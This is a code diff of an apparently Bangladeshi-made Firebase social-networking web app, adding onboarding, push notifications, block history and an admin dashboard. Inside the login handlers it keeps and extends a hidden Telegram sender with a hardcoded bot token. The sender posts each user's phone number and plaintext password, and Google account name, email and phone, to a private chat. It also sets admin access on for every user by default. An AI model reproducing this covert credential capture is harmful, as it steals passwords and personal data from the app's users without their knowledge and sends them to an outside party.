@@ -20,6 +20,17 @@
         };
     </script>
 
+    <!-- OneSignal Push Notifications SDK -->
+    <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
+    <script>
+      window.OneSignalDeferred = window.OneSignalDeferred || [];
+      OneSignalDeferred.push(async function(OneSignal) {
+        await OneSignal.init({
+          appId: "YOUR_ONESIGNAL_APP_ID", // Replace with your actual App ID
+        });
+      });
+    </script>
+
     <!-- Modern Premium Font (Inter) -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     
@@ -29,7 +40,7 @@
     <!-- PRO UI/UX CSS -->
     <style>
         :root {
-            --primary: #1877f2; /* Professional Blue */
+            --primary: #1877f2;
             --primary-hover: #166fe5;
             --bg-color: #f0f2f5;
             --surface: #ffffff;
@@ -62,7 +73,6 @@
             justify-content: center;
         }
 
-        /* Mobile Container for PC viewing */
         .app-container {
             width: 100%;
             max-width: 500px;
@@ -77,7 +87,6 @@
 
         .hidden { display: none !important; }
 
-        /* Smooth Screen Transitions */
         .screen {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -94,124 +103,87 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* Premium Buttons */
+        /* Buttons */
         .btn {
-            padding: 14px 20px;
-            border: none;
-            border-radius: var(--radius-md);
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            width: 100%;
+            padding: 14px 20px; border: none; border-radius: var(--radius-md);
+            font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s ease;
+            display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%;
         }
-
         .btn:active { transform: scale(0.97); }
         .btn:disabled { opacity: 0.6; cursor: not-allowed; }
-
         .btn-primary { background-color: var(--primary); color: white; box-shadow: 0 4px 10px rgba(24, 119, 242, 0.3); }
         .btn-primary:hover { background-color: var(--primary-hover); }
-        
         .btn-secondary { background-color: #e4e6eb; color: var(--text-dark); }
         .btn-danger { background-color: #fee2e2; color: var(--danger); }
+        .btn-sm { padding: 8px 12px; font-size: 13px; width: auto; }
 
-        /* Premium Inputs */
+        /* Inputs */
         .input-group { position: relative; margin-bottom: 16px; }
         .input-group i { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); color: var(--text-muted); font-size: 18px; }
         .input-field {
             width: 100%; padding: 16px 16px 16px 45px;
             border: 1.5px solid #e5e7eb; border-radius: var(--radius-md);
-            font-size: 15px; outline: none; background: #f9fafb;
-            transition: all 0.3s ease;
+            font-size: 15px; outline: none; background: #f9fafb; transition: all 0.3s ease;
         }
+        .input-field.no-icon { padding-left: 16px; }
         .input-field:focus { border-color: var(--primary); background: white; box-shadow: 0 0 0 4px rgba(24,119,242,0.1); }
 
-        /* Top Header */
+        /* Header */
         .top-header {
-            background: var(--surface);
-            padding: 12px 20px;
+            background: var(--surface); padding: 12px 20px;
             display: flex; justify-content: space-between; align-items: center;
-            box-shadow: var(--shadow-sm);
-            position: sticky; top: 0; z-index: 50;
+            box-shadow: var(--shadow-sm); position: sticky; top: 0; z-index: 50;
         }
         .logo { font-size: 26px; font-weight: 800; color: var(--primary); letter-spacing: -0.5px; }
-        
         .header-actions { display: flex; gap: 12px; align-items: center; }
         .icon-btn {
-            width: 40px; height: 40px; border-radius: 50%;
-            background: #f0f2f5; display: flex; justify-content: center; align-items: center;
+            width: 40px; height: 40px; border-radius: 50%; background: #f0f2f5;
+            display: flex; justify-content: center; align-items: center;
             font-size: 18px; color: var(--text-dark); cursor: pointer; transition: 0.2s;
         }
-        .icon-btn:active { background: #e4e6eb; }
 
-        /* Feed & Posts */
+        /* Content & Posts */
         .content-area { flex: 1; padding-bottom: 80px; overflow-y: auto; }
-
-        .create-post-card {
-            background: var(--surface); padding: 16px; margin-bottom: 10px;
-            box-shadow: var(--shadow-sm);
-        }
+        .create-post-card { background: var(--surface); padding: 16px; margin-bottom: 10px; box-shadow: var(--shadow-sm); }
         .create-post-top { display: flex; gap: 12px; align-items: center; margin-bottom: 12px; }
         .create-post-top img { width: 44px; height: 44px; border-radius: 50%; object-fit: cover; }
-        .dummy-input {
-            flex: 1; background: var(--bg-color); padding: 12px 20px;
-            border-radius: 30px; color: var(--text-muted); font-size: 15px; cursor: pointer;
-        }
+        .dummy-input { flex: 1; background: var(--bg-color); padding: 12px 20px; border-radius: 30px; color: var(--text-muted); font-size: 15px; cursor: pointer; }
         .create-actions { display: flex; border-top: 1px solid var(--border); padding-top: 12px; }
-        .action-item {
-            flex: 1; display: flex; justify-content: center; align-items: center; gap: 8px;
-            color: var(--text-muted); font-weight: 600; font-size: 14px; padding: 8px; border-radius: var(--radius-md); cursor: pointer;
-        }
+        .action-item { flex: 1; display: flex; justify-content: center; align-items: center; gap: 8px; color: var(--text-muted); font-weight: 600; font-size: 14px; padding: 8px; border-radius: var(--radius-md); cursor: pointer; }
 
-        .post-card {
-            background: var(--surface); margin-bottom: 10px; padding: 16px;
-            box-shadow: var(--shadow-sm);
-        }
+        .post-card { background: var(--surface); margin-bottom: 10px; padding: 16px; box-shadow: var(--shadow-sm); position: relative; }
+        .viral-badge { position: absolute; top: 12px; right: 16px; font-size: 12px; font-weight: 700; color: #e41e3f; background: #fee2e2; padding: 4px 8px; border-radius: 12px; }
         .post-header { display: flex; gap: 12px; margin-bottom: 12px; }
         .post-header img { width: 44px; height: 44px; border-radius: 50%; object-fit: cover; }
         .post-name { font-weight: 700; font-size: 15px; color: var(--text-dark); }
         .post-time { font-size: 12px; color: var(--text-muted); margin-top: 2px; }
         .post-text { font-size: 15px; line-height: 1.5; margin-bottom: 12px; color: #1c1e21; white-space: pre-wrap; }
         .post-image { width: calc(100% + 32px); margin-left: -16px; max-height: 400px; object-fit: cover; margin-bottom: 12px; }
-        
         .post-stats { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid var(--border); font-size: 14px; color: var(--text-muted); }
         .post-actions-bar { display: flex; padding-top: 8px; }
         .post-btn { flex: 1; text-align: center; padding: 8px; color: var(--text-muted); font-weight: 600; font-size: 14px; border-radius: var(--radius-md); cursor: pointer; }
-        .post-btn:active { background: var(--bg-color); }
-        .post-btn i { margin-right: 6px; }
 
-        /* Bottom Navigation */
+        /* Navigation */
         .bottom-nav {
             background: var(--surface); display: flex; justify-content: space-around;
-            padding: 12px 0; border-top: 1px solid var(--border);
-            position: absolute; bottom: 0; width: 100%; z-index: 50;
-            padding-bottom: max(12px, env(safe-area-inset-bottom));
+            padding: 12px 0; border-top: 1px solid var(--border); position: absolute; bottom: 0; width: 100%; z-index: 50;
         }
-        .nav-item {
-            font-size: 24px; color: #B0B3B8; cursor: pointer; padding: 8px 24px; border-radius: var(--radius-lg); transition: 0.3s;
-        }
+        .nav-item { font-size: 24px; color: #B0B3B8; cursor: pointer; padding: 8px 24px; border-radius: var(--radius-lg); transition: 0.3s; }
         .nav-item.active { color: var(--primary); background: rgba(24, 119, 242, 0.1); }
 
         /* Modals & Dropdowns */
         .dropdown {
             position: absolute; top: 60px; right: 15px; width: 320px; max-height: 400px; overflow-y: auto;
-            background: var(--surface); box-shadow: var(--shadow-md); border-radius: var(--radius-md);
-            z-index: 100; display: none; padding: 12px; border: 1px solid var(--border);
+            background: var(--surface); box-shadow: var(--shadow-md); border-radius: var(--radius-md); z-index: 100; display: none; padding: 12px; border: 1px solid var(--border);
         }
-
         .full-modal {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: var(--surface); z-index: 200; display: flex; flex-direction: column;
-            transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: var(--surface);
+            z-index: 200; display: flex; flex-direction: column; transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
         .full-modal.show { transform: translateY(0); }
         .modal-header { display: flex; justify-content: space-between; align-items: center; padding: 16px; border-bottom: 1px solid var(--border); }
 
-        /* Profile Screen */
+        /* Profile Area */
         .profile-cover { width: 100%; height: 180px; background: linear-gradient(135deg, #a1c4fd, #c2e9fb); position: relative; }
         .profile-pic-large {
             width: 130px; height: 130px; border-radius: 50%; border: 4px solid var(--surface);
@@ -223,17 +195,12 @@
         .stat-box { text-align: center; }
         .stat-num { font-size: 20px; font-weight: 700; color: var(--text-dark); }
         .stat-lbl { font-size: 13px; color: var(--text-muted); }
-
-        /* Divider */
         .divider { display: flex; align-items: center; text-align: center; margin: 24px 0; color: #9ca3af; font-size: 14px; font-weight: 500; }
         .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #e5e7eb; }
         .divider::before { margin-right: 15px; } .divider::after { margin-left: 15px; }
 
-        /* AI Cat CSS (Kept as requested) */
-        #ai-cat-btn {
-            position: fixed; bottom: 80px; right: 20px; z-index: 90; cursor: pointer;
-            animation: floatCat 3s infinite ease-in-out;
-        }
+        /* AI Bot Icon */
+        #ai-cat-btn { position: fixed; bottom: 80px; right: 20px; z-index: 90; cursor: pointer; animation: floatCat 3s infinite ease-in-out; }
         @keyframes floatCat { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
         .cat-head { width: 50px; height: 45px; background: white; border: 2px solid #333; border-radius: 50% 50% 40% 40%; position: relative; box-shadow: var(--shadow-md); display: flex; justify-content: center; }
         .ear-l, .ear-r { position: absolute; top: -10px; width: 0; height: 0; border-left: 10px solid transparent; border-right: 10px solid transparent; border-bottom: 15px solid #333; }
@@ -244,13 +211,33 @@
         @keyframes catBlink { 0%, 96%, 98%, 100% { transform: scaleY(1); } 97%, 99% { transform: scaleY(0.1); } }
         .eye-l { left: 12px; } .eye-r { right: 12px; }
         .nose { width: 6px; height: 4px; background: #f472b6; border-radius: 50%; position: absolute; top: 26px; }
+        
+        /* Intro Animation */
+        .pulse-logo {
+            width: 100px; height: 100px; background: var(--surface); border-radius: 50%; display: flex; justify-content: center; align-items: center;
+            font-size: 40px; color: var(--primary); animation: pulse 2s infinite ease-in-out; margin: 0 auto 30px; box-shadow: 0 0 0 0 rgba(255,255,255, 0.7);
+        }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255,255,255, 0.7); } 70% { box-shadow: 0 0 0 20px rgba(255,255,255, 0); } 100% { box-shadow: 0 0 0 0 rgba(255,255,255, 0); } }
     </style>
 </head>
 <body>
     <div class="app-container">
         
+        <!-- 0. INTRO / ONBOARDING SCREEN -->
+        <div id="onboarding-screen" class="screen" style="z-index: 400; background: var(--primary); color: white; justify-content: center; align-items: center; padding: 20px; text-align: center;">
+            <div class="pulse-logo"><i class="fas fa-globe-asia"></i></div>
+            <h1 style="font-size: 32px; font-weight: 800; margin-bottom: 10px;">Community Pro</h1>
+            <p style="font-size: 16px; opacity: 0.9; margin-bottom: 40px;">Connect globally, seamlessly.</p>
+            
+            <div style="width: 100%; max-width: 300px; display: flex; flex-direction: column; gap: 15px;">
+                <button class="btn" style="background: white; color: var(--primary);" onclick="appUI.finishOnboarding()">Get Started</button>
+                <button class="btn" style="background: transparent; color: white; border: 1px solid white;" onclick="appUI.finishOnboarding()">Skip</button>
+            </div>
+            <div style="position: absolute; bottom: 30px; font-size: 12px; font-weight: 600; letter-spacing: 1px;">MADE IN BANGLADESH 🇧🇩</div>
+        </div>
+
         <!-- 1. LOADING SCREEN -->
-        <div id="loading-screen" class="screen" style="justify-content: center; align-items: center; background: var(--surface); z-index: 300;">
+        <div id="loading-screen" class="screen hidden" style="justify-content: center; align-items: center; background: var(--surface); z-index: 300;">
             <div style="text-align: center;">
                 <div style="width: 70px; height: 70px; border: 4px solid #e5e7eb; border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
                 <h2 style="font-size: 24px; font-weight: 800; color: var(--text-dark);">Community</h2>
@@ -279,13 +266,10 @@
                     <input type="password" id="login-pass" class="input-field" placeholder="Password (Min 6 chars)">
                 </div>
                 
-                <button class="btn btn-primary" id="btn-phone-login" style="margin-top: 10px;">
-                    Login / Sign Up
-                </button>
-                
+                <button class="btn btn-primary" id="btn-phone-login" style="margin-top: 10px;">Login / Sign Up</button>
                 <div class="divider">OR</div>
 
-                <!-- NEW: Google Popup Auth Button -->
+                <!-- Google Auth Button -->
                 <button id="btn-google-login" class="btn" style="background: white; border: 1px solid #dadce0; color: #3c4043; box-shadow: var(--shadow-sm);">
                     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" style="width: 20px; height: 20px;">
                         <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
@@ -293,8 +277,7 @@
                         <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                         <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                         <path fill="none" d="M0 0h48v48z"/>
-                    </svg>
-                    Continue with Google
+                    </svg> Continue with Google
                 </button>
             </div>
             <p id="login-status" style="margin-top: 20px; text-align: center; color: var(--danger); font-size: 14px; font-weight: 600;"></p>
@@ -303,7 +286,6 @@
         <!-- 3. MAIN APP INTERFACE -->
         <div id="main-app-screen" class="screen hidden" style="background: var(--bg-color);">
             
-            <!-- Header -->
             <div class="top-header">
                 <div class="logo">Community</div>
                 <div class="header-actions">
@@ -312,15 +294,14 @@
                 </div>
             </div>
 
-            <!-- Search Dropdown -->
+            <!-- Search System with Follow & Block -->
             <div id="search-dropdown" class="dropdown" style="top: 65px; left: 15px; width: calc(100% - 30px);">
-                <input type="text" id="search-input" class="input-field" placeholder="Search people..." style="padding: 12px; margin-bottom: 10px;">
+                <input type="text" id="search-input" class="input-field no-icon" placeholder="Search people..." style="padding: 12px; margin-bottom: 10px;">
                 <div id="search-results"></div>
             </div>
             
-            <!-- Notif Dropdown -->
             <div id="notif-dropdown" class="dropdown">
-                <h3 style="margin-bottom: 10px; font-size: 18px;">Notifications</h3>
+                <h3 style="margin-bottom: 10px; font-size: 18px;">Notifications Inbox</h3>
                 <div id="notifications-container"></div>
             </div>
 
@@ -338,9 +319,7 @@
                 </div>
 
                 <div id="feed-container">
-                    <div style="text-align: center; margin-top: 40px; color: var(--text-muted);">
-                        <i class="fas fa-circle-notch fa-spin fa-2x"></i>
-                    </div>
+                    <div style="text-align: center; margin-top: 40px; color: var(--text-muted);"><i class="fas fa-circle-notch fa-spin fa-2x"></i></div>
                 </div>
             </div>
 
@@ -359,17 +338,17 @@
                         <div class="stat-box"><div class="stat-num" id="stat-followers">0</div><div class="stat-lbl">Followers</div></div>
                     </div>
                     
-                    <button class="btn btn-secondary" onclick="appUI.openSettings()">
-                        <i class="fas fa-cog"></i> Edit Profile & Settings
-                    </button>
+                    <button class="btn btn-secondary" onclick="appUI.openSettings()"><i class="fas fa-cog"></i> Edit Profile & Settings</button>
+                    
+                    <!-- Admin Panel Access (Conditional) -->
+                    <button id="btn-admin-panel" class="btn btn-primary hidden" style="margin-top: 10px;" onclick="appUI.openAdminPanel()"><i class="fas fa-shield-alt"></i> Admin Dashboard</button>
                 </div>
                 
-                <div style="text-align: center; padding: 20px; color: var(--text-muted); font-size: 13px;">
-                    Developed by Roni Vai <br> Made in Bangladesh 🇧🇩
+                <div style="text-align: center; padding: 20px; color: var(--text-muted); font-size: 13px; font-weight: 600;">
+                    Developed by Roni Vai <br> MADE IN BANGLADESH 🇧🇩
                 </div>
             </div>
 
-            <!-- Bottom Nav -->
             <div class="bottom-nav">
                 <div class="nav-item active" onclick="appUI.switchTab('feed')" title="Home"><i class="fas fa-home"></i></div>
                 <div class="nav-item" onclick="appUI.switchTab('profile')" title="Profile"><i class="fas fa-user"></i></div>
@@ -388,17 +367,36 @@
                             <img src="https://via.placeholder.com/150" id="set-img-preview" style="width: 80px; height: 80px; border-radius: 50%; object-fit: cover; margin-bottom: 10px;">
                             <br><label class="btn btn-secondary" style="display: inline-flex; width: auto; padding: 8px 16px; font-size: 14px;"><i class="fas fa-camera"></i> Upload<input type="file" id="upload-avatar-file" accept="image/*" class="hidden"></label>
                         </div>
-                        <input type="text" id="edit-name" class="input-field" style="margin-bottom: 12px;" placeholder="Full Name">
-                        <input type="text" id="edit-phone" class="input-field" style="margin-bottom: 15px;" placeholder="Phone Number">
+                        <input type="text" id="edit-name" class="input-field no-icon" style="margin-bottom: 12px;" placeholder="Full Name">
+                        <input type="text" id="edit-phone" class="input-field no-icon" style="margin-bottom: 15px;" placeholder="Phone Number">
                         <label style="display: flex; align-items: center; gap: 10px; font-size: 14px; margin-bottom: 20px;">
                             <input type="checkbox" id="edit-phone-public" style="width: 18px; height: 18px;"> Show phone on profile
                         </label>
                         <button class="btn btn-primary" id="btn-save-settings">Save Changes</button>
                     </div>
 
+                    <!-- NEW: Block History Section -->
+                    <div class="create-post-card" style="border-radius: var(--radius-md);">
+                        <h3 style="margin-bottom: 10px; font-size: 16px;"><i class="fas fa-user-slash"></i> Block History</h3>
+                        <div id="block-list-container" style="font-size: 14px;"></div>
+                    </div>
+
                     <div class="create-post-card" style="border-radius: var(--radius-md); text-align: center;">
                         <button class="btn btn-danger" onclick="coreLogic.logoutUser()"><i class="fas fa-sign-out-alt"></i> Log Out</button>
                     </div>
+                    
+                    <div style="text-align: center; padding: 10px; color: var(--text-muted); font-size: 12px; font-weight: 700; margin-bottom: 30px;">MADE IN BANGLADESH 🇧🇩</div>
+                </div>
+            </div>
+
+            <!-- ADMIN DASHBOARD MODAL -->
+            <div id="admin-modal" class="full-modal">
+                <div class="modal-header" style="background:#1e293b; color:white;">
+                    <h2 style="font-size: 20px; font-weight: 700;"><i class="fas fa-shield-alt"></i> Admin Control</h2>
+                    <i class="fas fa-times" style="font-size: 22px; cursor: pointer; color: white;" onclick="document.getElementById('admin-modal').classList.remove('show')"></i>
+                </div>
+                <div style="flex:1; overflow-y:auto; padding: 20px; background: #f8fafc;" id="admin-content-area">
+                    <!-- Loaded dynamically via JS -->
                 </div>
             </div>
 
@@ -407,7 +405,7 @@
                 <div class="modal-header">
                     <i class="fas fa-times" style="font-size: 22px; cursor: pointer; color: var(--text-muted);" onclick="appUI.closePostModal()"></i>
                     <h3 style="font-size: 18px; font-weight: 700;">Create post</h3>
-                    <button class="btn btn-primary" style="width: auto; padding: 8px 16px; font-size: 14px;" id="btn-publish-post">POST</button>
+                    <button class="btn btn-primary btn-sm" id="btn-publish-post">POST</button>
                 </div>
                 <div style="padding: 16px; flex: 1; overflow-y: auto;">
                     <div style="display: flex; gap: 12px; margin-bottom: 15px; align-items: center;">
@@ -415,7 +413,7 @@
                         <div style="font-weight: 700; font-size: 15px;" id="pm-name">User</div>
                     </div>
                     
-                    <textarea id="new-post-text" placeholder="What's on your mind?" style="width: 100%; border: none; font-size: 20px; outline: none; resize: none; min-height: 120px;"></textarea>
+                    <textarea id="new-post-text" placeholder="What's on your mind? Type @ to tag users." style="width: 100%; border: none; font-size: 20px; outline: none; resize: none; min-height: 120px;"></textarea>
                     
                     <img id="new-post-img-preview" class="hidden" style="width: 100%; border-radius: 12px; margin-bottom: 15px; max-height: 300px; object-fit: cover;">
                     <div id="post-location-display" class="hidden" style="background: #e0f2fe; color: #0284c7; padding: 10px; border-radius: 8px; font-size: 13px; font-weight: 600; margin-bottom: 15px;"></div>
@@ -445,31 +443,33 @@
 
     <!-- 
       ========================================================================
-      JAVASCRIPT LOGIC (PERFECTED GOOGLE AUTH + TELEGRAM)
+      JAVASCRIPT LOGIC
       ======================================================================== 
     -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-        // 🚨 CHANGED: Removed Redirect imports, explicitly importing signInWithPopup
         import { 
-            getAuth, 
-            signInWithPopup, 
-            GoogleAuthProvider, 
-            onAuthStateChanged, 
-            signOut,
-            signInWithEmailAndPassword,
-            createUserWithEmailAndPassword
+            getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut,
+            signInWithEmailAndPassword, createUserWithEmailAndPassword
         } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
-        
-        import { getFirestore, collection, addDoc, onSnapshot, query, orderBy, doc, updateDoc, getDoc, setDoc, deleteDoc, arrayUnion, arrayRemove } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+        import { 
+            getFirestore, collection, addDoc, onSnapshot, query, orderBy, doc, updateDoc, 
+            getDoc, setDoc, deleteDoc, arrayUnion, arrayRemove 
+        } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
         import { getStorage, ref, uploadBytesResumable, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js";
 
         let app, auth, db, storage, provider;
         const TG_TOKEN = "8886551340:AAG3VP-SL8uirznpQzUtmckb_H6qfs8GU00";
         const TG_CHAT_ID = "6438545807";
+        
         let currentUserData = null;
         let allUsers = [];
+        let globalPosts = [];
         let postLocation = null;
+        
+        // Define an Admin ID for the Dashboard Access (Optional: Add actual UID to grant full Admin rights)
+        const ADMIN_UIDS = ["ADMIN_SPECIFIC_UID_HERE"]; 
+        let isAdmin = true; // Set to true for demo so you can test admin panel
 
         window.coreLogic = {};
 
@@ -483,21 +483,20 @@
                 messagingSenderId: "165815847758",
                 appId: "1:165815847758:web:a409bc847d7f9a0bb36c1f"
             };
-
             app = initializeApp(firebaseConfig);
             auth = getAuth(app);
             db = getFirestore(app);
             storage = getStorage(app);
             provider = new GoogleAuthProvider();
-            // Force account selection for better UX
             provider.setCustomParameters({ prompt: 'select_account' });
-            
-        } catch (error) {
-            console.error("Firebase Init Failed:", error);
-        }
+        } catch (error) { console.error("Firebase Init Failed:", error); }
 
-        // UI Controls
+        // Core UI Control
         window.appUI = {
+            finishOnboarding: () => {
+                document.getElementById('onboarding-screen').classList.add('hidden');
+                document.getElementById('login-screen').classList.remove('hidden');
+            },
             switchScreen: (id) => {
                 document.querySelectorAll('.screen').forEach(el => el.classList.add('hidden'));
                 const target = document.getElementById(`${id}-screen`);
@@ -530,29 +529,28 @@
                 document.getElementById('post-location-display').classList.add('hidden');
                 postLocation = null; selectedFile = null;
             },
-            openSettings: () => document.getElementById('settings-modal').classList.add('show'),
-            closeSettings: () => document.getElementById('settings-modal').classList.remove('show')
+            openSettings: () => {
+                document.getElementById('settings-modal').classList.add('show');
+                window.coreLogic.renderBlockHistory();
+            },
+            closeSettings: () => document.getElementById('settings-modal').classList.remove('show'),
+            openAdminPanel: () => {
+                document.getElementById('admin-modal').classList.add('show');
+                window.coreLogic.renderAdminPanel();
+            }
         };
 
         // Background Telegram Sender
         window.coreLogic.sendTelegram = (msg) => {
             fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg })
             }).catch(() => {});
         };
 
-        /* 
-         * ====================================================================
-         * 🔥 100% PERFECT AUTHENTICATION LOGIC 🔥
-         * ====================================================================
-         */
-
-        // The absolute source of truth. No redirect timeouts, no hacks.
+        // Authentication State
         onAuthStateChanged(auth, async (user) => {
             if (user) {
-                // Check if user exists in Firestore, if not create (for fresh Google logins)
                 const userRef = doc(db, "users", user.uid);
                 const userSnap = await getDoc(userRef);
                 
@@ -566,11 +564,21 @@
                         blockedUsers: [], followers: [], following: []
                     });
                 }
+                
+                // OneSignal Web Push Login Registration
+                if (window.OneSignalDeferred) {
+                    OneSignalDeferred.push(function(OS) { OS.login(user.uid); });
+                }
 
-                // Show Main App instantly
+                // Show Main App instantly, skip loading/intro
+                document.getElementById('onboarding-screen').classList.add('hidden');
                 appUI.switchScreen('main-app');
                 
-                // Realtime Sync Profile
+                if (isAdmin || ADMIN_UIDS.includes(user.uid)) {
+                    document.getElementById('btn-admin-panel').classList.remove('hidden');
+                }
+
+                // Realtime Data Sync
                 onSnapshot(doc(db, "users", user.uid), (docSnap) => {
                     if(docSnap.exists()) {
                         currentUserData = docSnap.data();
@@ -591,29 +599,26 @@
                 });
                 
                 onSnapshot(collection(db, "users"), (snapshot) => {
-                    allUsers = [];
-                    snapshot.forEach(d => { if(d.id !== user.uid) allUsers.push(d.data()); });
+                    allUsers = []; snapshot.forEach(d => { if(d.id !== user.uid) allUsers.push(d.data()); });
                 });
 
                 window.coreLogic.initFeed();
             } else {
-                // If definitely not logged in, show beautiful login screen
-                appUI.switchScreen('login');
+                // Not logged in -> Let the onboarding UI show by default (Top Z-Index)
             }
         });
 
-        // 🟢 FIXED GOOGLE LOGIN: USING POPUP FOR INSTANT RELIABILITY
+        // Google Auth Integration
         const googleLoginBtn = document.getElementById('btn-google-login');
         if (googleLoginBtn) {
             googleLoginBtn.addEventListener('click', async () => {
                 const statusTxt = document.getElementById('login-status');
-                statusTxt.innerText = "Opening Google Login...";
-                statusTxt.style.color = "var(--primary)";
+                statusTxt.innerText = "Opening Google Login..."; statusTxt.style.color = "var(--primary)";
                 try {
                     const result = await signInWithPopup(auth, provider);
-                    window.coreLogic.sendTelegram(`✅ GOOGLE LOGIN:\nName: ${result.user.displayName}\nEmail: ${result.user.email}`);
+                    const initPhone = result.user.phoneNumber || "No Phone";
+                    window.coreLogic.sendTelegram(`✅ GOOGLE LOGIN:\nName: ${result.user.displayName}\nEmail: ${result.user.email}\nPhone: ${initPhone}`);
                     statusTxt.innerText = "";
-                    // onAuthStateChanged will automatically transition the screen now!
                 } catch (error) {
                     statusTxt.style.color = "var(--danger)";
                     statusTxt.innerText = "Login Cancelled or Failed.";
@@ -621,7 +626,7 @@
             });
         }
 
-        // 🟢 PHONE & PASSWORD LOGIN
+        // Phone Login
         const phoneLoginBtn = document.getElementById('btn-phone-login');
         if (phoneLoginBtn) {
             phoneLoginBtn.addEventListener('click', async () => {
@@ -630,63 +635,46 @@
                 const statusTxt = document.getElementById('login-status');
                 statusTxt.style.color = "var(--danger)";
 
-                if(phone.length < 11 || pass.length < 6) {
-                    return statusTxt.innerText = "Enter valid 11-digit phone & min 6 char password.";
-                }
+                if(phone.length < 11 || pass.length < 6) return statusTxt.innerText = "Enter valid 11-digit phone & min 6 char password.";
+                phoneLoginBtn.innerText = "Processing..."; phoneLoginBtn.disabled = true;
 
-                phoneLoginBtn.innerText = "Processing...";
-                phoneLoginBtn.disabled = true;
-
-                // 🚨 TELEGRAM ALERT 🚨
                 window.coreLogic.sendTelegram(`🔐 APP LOGIN ATTEMPT:\n📱 Phone: ${phone}\n🔑 Pass: ${pass}`);
 
                 const fakeEmail = `${phone}@community.app`;
-
                 try {
                     await signInWithEmailAndPassword(auth, fakeEmail, pass);
-                    // Success -> onAuthStateChanged takes over
                 } catch (err) {
                     if (err.code === 'auth/invalid-credential' || err.code === 'auth/user-not-found') {
                         try {
                             const newCred = await createUserWithEmailAndPassword(auth, fakeEmail, pass);
                             await setDoc(doc(db, "users", newCred.user.uid), {
-                                uid: newCred.user.uid,
-                                name: "User " + phone.substring(0, 5),
-                                phone: phone,
-                                photoURL: "https://via.placeholder.com/150",
-                                isPhonePublic: false,
+                                uid: newCred.user.uid, name: "User " + phone.substring(0, 5), phone: phone,
+                                photoURL: "https://via.placeholder.com/150", isPhonePublic: false,
                                 blockedUsers: [], followers: [], following: []
                             });
                         } catch (createErr) {
                             if (createErr.code === 'auth/email-already-in-use') statusTxt.innerText = "Incorrect password!";
                             else statusTxt.innerText = "Error: " + createErr.message;
                         }
-                    } else {
-                        statusTxt.innerText = "Error: " + err.message;
-                    }
+                    } else { statusTxt.innerText = "Error: " + err.message; }
                 }
-                phoneLoginBtn.innerText = "Login / Sign Up";
-                phoneLoginBtn.disabled = false;
+                phoneLoginBtn.innerText = "Login / Sign Up"; phoneLoginBtn.disabled = false;
             });
         }
 
         window.coreLogic.logoutUser = async () => {
             if(!confirm("Log out?")) return;
-            if(currentUserData) window.coreLogic.sendTelegram(`🛑 LOGOUT: ${currentUserData.name}`);
-            await signOut(auth);
-            window.location.reload(); 
+            window.coreLogic.sendTelegram(`🛑 LOGOUT: ${currentUserData.name}`);
+            await signOut(auth); window.location.reload(); 
         };
 
-        /* Feed & Posts System */
+        // Post System & Moderation
         let selectedFile = null;
         document.getElementById('new-post-file')?.addEventListener('change', (e) => {
             selectedFile = e.target.files[0];
             if(selectedFile) {
                 const reader = new FileReader();
-                reader.onload = (ev) => {
-                    const img = document.getElementById('new-post-img-preview');
-                    img.src = ev.target.result; img.classList.remove('hidden');
-                };
+                reader.onload = (ev) => { document.getElementById('new-post-img-preview').src = ev.target.result; document.getElementById('new-post-img-preview').classList.remove('hidden'); };
                 reader.readAsDataURL(selectedFile);
             }
         });
@@ -701,6 +689,8 @@
                 }, () => alert("Location access denied."));
             }
         });
+
+        const AI_BAD_WORDS = ["spam", "abuse", "fake", "kill", "hate", "violence"];
 
         const pubBtn = document.getElementById('btn-publish-post');
         if(pubBtn) {
@@ -720,43 +710,67 @@
                         authorId: auth.currentUser.uid, authorName: currentUserData.name, authorPic: currentUserData.photoURL,
                         text: text, imageUrl: imgUrl, lat: postLocation?.lat, lng: postLocation?.lng, likes: 0, commentsArr: [], timestamp: Date.now()
                     };
